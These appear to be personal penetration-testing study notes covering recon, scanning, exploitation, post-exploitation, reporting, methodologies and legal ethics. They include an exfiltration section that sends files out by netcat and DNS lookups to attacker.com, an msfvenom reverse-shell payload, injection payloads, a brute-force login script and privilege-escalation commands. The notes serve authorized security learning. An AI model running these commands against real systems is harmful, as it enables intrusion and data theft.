
-----------------------------------------------------------------------
## 1. What's a Pentest or Penetration test , Really?

- **Vulnerability Scan:** An automated tool finds a list of _possible_ problems.
- **Penetration Test:** you try to break in to _prove_ those problems are real and exploitable.

A **VAPT** (Vulnerability Assessment and Penetration Test) is the whole package. you use the scanner to find leads, then you do the pentest to confirm them.


## 2. Core Phases of Penetration Testing

#### 1. **Planning / Pre-engagement** 
This is the foundational phase where the client and testing team collaborate to define the test's scope, objectives, timelines, and legal Rules of Engagement
#### 2. **RECONNAISSANCE  -

The process of collecting as much information as possible about the target system without directly interacting with it.

##### **Two Types:**

1. **Passive Reconnaissance:**¬†No direct interaction with target
2. **Active Reconnaissance:**¬†Direct interaction with target systems

##### **Detailed Recon Techniques & Tools:**

**üîç OSINT (Open Source Intelligence) Techniques:**

- **Google Dorking Examples:**
    ```
    site:target.com filetype:pdf
    site:target.com inurl:admin
    site:target.com "confidential" OR "internal use only"
    intitle:"index of" site:target.com
    ```
    
- **Shodan.io Queries:**
    ```
    hostname:target.com
    org:"Target Company Name"
    ssl:"target.com" port:443
    net:192.168.1.0/24
    ```

**Key Tools & Their Usage:**

|Tool|Purpose|Example Command|
|---|---|---|
|**Shodan**|Internet-connected device search|`shodan search apache port:80 country:US`|
|**TheHarvester**|Email/subdomain enumeration|`theHarvester -d target.com -b google`|
|**Recon-ng**|Web reconnaissance framework|`recon-ng -w targetworkspace`|
|**Maltego**|Visual link analysis|GUI-based relationship mapping|
|**SpiderFoot**|Automated OSINT collection|`spiderfoot -s target.com`|
|**FOCA**|Metadata extraction|Analyze documents for metadata|

**Information to Gather:**

- [ ]  Employee names and email formats
- [ ] Subdomains and IP ranges
- [ ] Technology stack (Wappalyzer, BuiltWith)
- [ ] Public code repositories (GitHub, GitLab)
- [ ] Social media intelligence
- [ ] Physical locations and office details
- [ ] Partner and vendor relationships


#### 3. **SCANNING & ENUMERATION**

Active probing of the target to identify live hosts, open ports, and running services.

##### **Detailed Scanning Types:**

**1. Network Scanning:**

Bash

```
# Nmap Examples
# TCP SYN Scan (Stealth)
nmap -sS -p- target.com

# UDP Scan
nmap -sU --top-ports 1000 target.com

# Service Version Detection
nmap -sV -sC -O target.com

# Aggressive Scan
nmap -A -T4 target.com

# Script Scanning
nmap --script vuln target.com
```
for more refer vulnerability scanning technique notes

**2. Vulnerability Scanning:**

**Nessus Configuration:**

- **Basic Network Scan:**¬†Identifies open ports and services
- **Credentialed Scan:**¬†Uses credentials for deeper inspection
- **Web Application Scan:**¬†Focuses on web vulnerabilities
- **Compliance Scan:**¬†Checks against standards (PCI-DSS, HIPAA)

**OpenVAS Setup:**

Bash

```
# Installation
sudo apt-get install openvas
sudo gvm-setup

```

**3. Service Enumeration:**

|Service|Port|Enumeration Tool|Command Example|
|---|---|---|---|
|**SMB**|445|enum4linux|`enum4linux -a target.com`|
|**HTTP/S**|80/443|Nikto|`nikto -h http://target.com`|
|**DNS**|53|dnsrecon|`dnsrecon -d target.com -t std`|
|**FTP**|21|nmap scripts|`nmap --script ftp-* -p 21 target.com`|
|**SSH**|22|ssh-audit|`ssh-audit target.com`|
|**SNMP**|161|snmpwalk|`snmpwalk -v2c -c public target.com`|

#### 4. **EXPLOITATION**

Attempting to compromise the system by exploiting discovered vulnerabilities.

**Metasploit Framework:** My exploitation toolkit. The example  process I follow:

1. Search for relevant exploits: `search apache struts`
2. Select exploit: `use exploit/multi/http/struts2_content_type_ognl`
3. Configure options: `set RHOSTS target_ip`
4. Choose payload: `set payload linux/x64/meterpreter/reverse_tcp`
5. Execute: `exploit`

**Common Exploitation Scenarios:**

**1. Web Application Exploits:**

Bash

```
# SQL Injection with SQLMap
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch

# XSS Testing
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# Command Injection
; ls -la
| whoami
`id`
```

**2. Network Service Exploits:**

- **Buffer Overflow:**¬†Exploit memory corruption vulnerabilities
- **Default Credentials:**¬†Try common username/password combinations
- **Misconfiguration:**¬†Exploit improperly configured services

**3. Social Engineering:**

- **Phishing campaigns**¬†using GoPhish or SET
- **Physical access**¬†attempts (tailgating, badge cloning)
- **Pretexting**¬†via phone calls

**Exploitation Tools Arsenal:**

| Tool                | Purpose                | Use Case                        |
| ------------------- | ---------------------- | ------------------------------- |
| **Metasploit**      | Exploitation framework | Multi-purpose exploitation      |
| **SQLMap**          | SQL injection          | Database exploitation           |
| **Burp Suite**      | Web app testing        | Intercepting/modifying requests |
| **BeEF**            | Browser exploitation   | Client-side attacks             |
| **Hydra**           | Password cracking      | Brute force attacks             |
| **John the Ripper** | Password cracking      | Hash cracking                   |
| **Cobalt Strike**   | Post-exploitation      | Advanced persistent access      |



#### 5. **POST-EXPLOITATION**

Activities performed after gaining initial access to maintain persistence and escalate privileges.

##### **Privilege Escalation Techniques:**

**Linux Privilege Escalation:**
bash -> 
```
# Check current privileges
id
whoami
sudo -l

# Search for SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check for writable directories
find / -writable -type d 2>/dev/null

# Kernel exploits
uname -a
searchsploit "linux kernel"

# Automated tools
./linpeas.sh
./linux-exploit-suggester.sh
```

**Windows Privilege Escalation:**

PowerShell ->

```
# Check current privileges
whoami /priv
net user %username%

# Search for passwords
findstr /si password *.xml *.ini *.txt

# Check scheduled tasks
schtasks /query /fo LIST /v

# Unquoted service paths
wmic service get name,displayname,pathname,startmode

# Automated tools
.\winPEAS.exe
.\PowerUp.ps1
```

**Persistence Mechanisms:**

**1. Linux Persistence:**

- Cron jobs
- SSH keys
- Backdoored binaries
- Init scripts
- Systemd services

**2. Windows Persistence:**

- Registry run keys
- Scheduled tasks
- Services
- DLL hijacking
- WMI event subscriptions

**Data Exfiltration Techniques:**

Bash -->

```
# Using netcat
nc -l -p 4444 > received_file.txt  # Receiver
nc target_ip 4444 < sensitive_file.txt  # Sender

# Using Python HTTP server
python3 -m http.server 8000  # Start server
wget http://attacker_ip:8000/file  # Download

# DNS exfiltration
for i in $(cat data.txt); do nslookup $i.attacker.com; done
```

#### 6. **REPORTING** 

Documenting findings and providing actionable recommendations.

##### **Report Structure:**

**1. Executive Summary**

- High-level overview for management
- Business impact analysis
- Risk ratings (Critical, High, Medium, Low)
- Key statistics and metrics

**2. Technical Details**

example report
```
## Vulnerability: SQL Injection in Login Form

### Risk Rating: Critical
### CVSS Score: 9.8

### Description:
The login form at /login.php is vulnerable to SQL injection
due to improper input sanitization.

### Proof of Concept:
Username: admin' OR '1'='1
Password: anything

### Impact:
- Complete database compromise
- User credential theft
- Data manipulation/deletion

### Remediation:
1. Implement parameterized queries
2. Use prepared statements
3. Input validation and sanitization
4. Implement WAF rules

### References:
- OWASP SQL Injection
- CWE-89
```

**3. Risk Matrix:**

|Severity|Likelihood|Risk Level|Action Required|
|---|---|---|---|
|Critical|High|Critical|Immediate|
|High|Medium|High|Within 7 days|
|Medium|Medium|Medium|Within 30 days|
|Low|Low|Low|Within 90 days|


---------------------------------------------------------------


## 3. PENETRATION TESTING METHODOLOGIES¬†

### **PTES (Penetration Testing Execution Standard)**

#### **Seven Phases of PTES:**

**1. Pre-engagement Interactions**

- **Scoping Questionnaire Elements:**
    - IP ranges and domains
    - Testing timeframes
    - Blackout periods
    - Critical systems to avoid
    - Emergency contacts
- **Legal Documentation:**
    - Statement of Work (SOW)
    - Non-Disclosure Agreement (NDA)
    - Rules of Engagement (ROE)
    - Get Out of Jail Free Card

**2. Intelligence Gathering**
- Corporate intelligence
- Physical locations
- Human intelligence
- Technical footprinting

**3. Threat Modeling**

```
## Threat Model Components:
- Assets identification
- Threat actors profiling
- Attack vectors mapping
- Risk scenarios development
```

**4. Vulnerability Analysis**
- Automated scanning
- Manual verification
- False positive elimination
- Vulnerability correlation

**5. Exploitation**
- Precision strikes
- Customized exploits
- Anti-forensics techniques

**6. Post Exploitation**
- Infrastructure analysis
- Pillaging
- Business impact analysis

**7. Reporting**
- Technical report
- Executive report
- Remediation roadmap

### **OWASP WSTG (Web Security Testing Guide)**

#### **Testing Categories:**

**1. Information Gathering**

Bash ->
```
# Fingerprint Web Server
whatweb target.com
wafw00f target.com

# Enumerate Applications
dirb http://target.com /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /path/to/wordlist
```

**2. Configuration Management Testing**

- File extensions handling
- Admin interfaces
- HTTP methods
- CORS implementation

**3. Identity Management Testing**

- User registration process
- Account provisioning
- Password policies
- Username enumeration

**4. Authentication Testing**

Python

```
# Example: Testing for weak lockout mechanism
import requests

url = "http://target.com/login"
usernames = ["admin", "user", "test"]
passwords = ["password", "123456", "admin"]

for user in usernames:
    for pwd in passwords:
        response = requests.post(url, data={
            "username": user,
            "password": pwd
        })
        if "Welcome" in response.text:
            print(f"Valid credentials: {user}:{pwd}")
```

**5. Authorization Testing**

- Path traversal
- Privilege escalation
- IDOR (Insecure Direct Object References)

**6. Session Management Testing**

- Session token analysis
- Cookie attributes
- Session fixation
- CSRF tokens

**7. Input Validation Testing**

- SQL Injection
- XSS (Reflected, Stored, DOM)
- Command Injection
- LDAP Injection
- XML Injection

**8. Error Handling**

- Error codes analysis
- Stack traces
- Debug information

**9. Cryptography Testing**

- SSL/TLS configuration
- Cipher suites
- Certificate validation

**10. Business Logic Testing**

- Workflow bypass
- Race conditions
- Time-of-check to time-of-use

**11. Client-side Testing**

- JavaScript execution
- HTML5 security
- WebSockets testing


## 4. ETHICS & LEGAL CONSIDERATIONS¬†

### **‚öñÔ∏è Legal Framework**

#### **Essential Legal Documents:**

**1. Rules of Engagement (ROE) Template:**


```
## RULES OF ENGAGEMENT

### Testing Scope:
- In-Scope Systems: [List IP ranges, domains]
- Out-of-Scope Systems: [Critical production systems]
- Testing Hours: [Business hours/After hours]
- Testing Duration: [Start date - End date]

### Authorized Activities:
‚úÖ Vulnerability scanning
‚úÖ Exploitation with containment
‚úÖ Password cracking (offline only)
‚ùå DoS/DDoS attacks
‚ùå Physical destruction
‚ùå Social engineering without approval

### Communication Protocol:
- Primary Contact: [Name, Phone, Email]
- Emergency Contact: [24/7 contact]
- Escalation Path: [Decision tree]

### Incident Response:
If critical vulnerability found:
1. Stop testing immediately
2. Document findings
3. Contact client within 1 hour
4. Await further instructions
```

**2. Authorization Letter Components:**

- Client company letterhead
- Specific authorization statement
- Tester identification
- Date and time validity
- Authorized signatures
- Contact information

### **üõ°Ô∏è Ethical Guidelines**

#### **Professional Standards:**

**1. EC-Council Code of Ethics:**

- Keep information confidential
- Not engage in illegal activities
- Report security breaches immediately
- Respect intellectual property

**2. SANS Ethics Guidelines:**

- Obtain explicit written permission
- Respect privacy and confidentiality
- Avoid unnecessary system damage
- Report findings responsibly

**3. Responsible Disclosure Process:**

```
## Vulnerability Disclosure Timeline:
Day 0: Vulnerability discovered
Day 1: Initial vendor notification
Day 7: Vendor acknowledgment expected
Day 30: Status update from vendor
Day 90: Public disclosure (coordinated)
Day 90+: Full technical details released
```

### **‚ö†Ô∏è Legal Implications**

**Potential Legal Violations to Avoid:**

|Law/Regulation|Region|Violation Impact|
|---|---|---|
|**CFAA**|USA|Federal criminal charges|
|**GDPR**|EU|Fines up to 4% annual revenue|
|**Data Protection Act**|UK|Criminal prosecution|
|**Cybercrime Act**|Various|Country-specific penalties|

**Best Practices for Legal Protection:**

1. **Always obtain written authorization**
2. **Define clear scope boundaries**
3. **Maintain detailed logs**
4. **Carry professional liability insurance**
5. **Join professional organizations**¬†(ISC2, EC-Council)
6. **Stay updated on local laws**

---

## 5. TOOLS & PRACTICAL IMPLEMENTATION

#### Essential Tool Categories

##### **Complete Toolset Matrix:**

| Category         | Tool            | Primary Use       | Key Commands                              |
| ---------------- | --------------- | ----------------- | ----------------------------------------- |
| **Recon**        | Shodan          | Device discovery  | `shodan search webcam country:US`         |
|                  | TheHarvester    | Email harvesting  | `theHarvester -d domain.com -b all`       |
|                  | Amass           | Subdomain enum    | `amass enum -d domain.com`                |
| **Scanning**     | Nmap            | Port scanning     | `nmap -sC -sV -O target`                  |
|                  | Masscan         | Fast scanning     | `masscan -p1-65535 target/24`             |
|                  | Nessus          | Vuln scanning     | GUI-based configuration                   |
| **Web Testing**  | Burp Suite      | Web proxy         | Intercept and modify requests             |
|                  | OWASP ZAP       | Web scanner       | Automated and manual testing              |
|                  | SQLMap          | SQL injection     | `sqlmap -u URL --batch --dbs`             |
| **Exploitation** | Metasploit      | Exploit framework | `msfconsole`                              |
|                  | Empire          | Post-exploitation | PowerShell empire framework               |
|                  | Cobalt Strike   | C2 framework      | Team server operations                    |
| **Password**     | Hashcat         | Hash cracking     | `hashcat -m 0 hash.txt wordlist.txt`      |
|                  | John the Ripper | Password cracking | `john --wordlist=list.txt hashes`         |
|                  | Hydra           | Online cracking   | `hydra -l admin -P pass.txt ssh://target` |



### **Common Commands Quick Reference**

```
# Reconnaissance
whois domain.com
nslookup domain.com
dig domain.com ANY
host -t mx domain.com

# Scanning
nmap -sn 192.168.1.0/24  # Ping sweep
nmap -sS -sV -O target    # SYN scan with version and OS
masscan -p1-65535 --rate=1000 target/24

# Web Testing
nikto -h http://target.com
dirb http://target.com
wfuzz -c -z file,wordlist.txt http://target/FUZZ

# Exploitation
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=attacker_ip LPORT=4444 -f exe > shell.exe

# Password Attacks
hashcat -m 1000 hash.txt rockyou.txt  # NTLM
john --format=sha512crypt hash.txt

# Privilege Escalation
# Linux
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null

# Windows
whoami /priv
net localgroup administrators
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

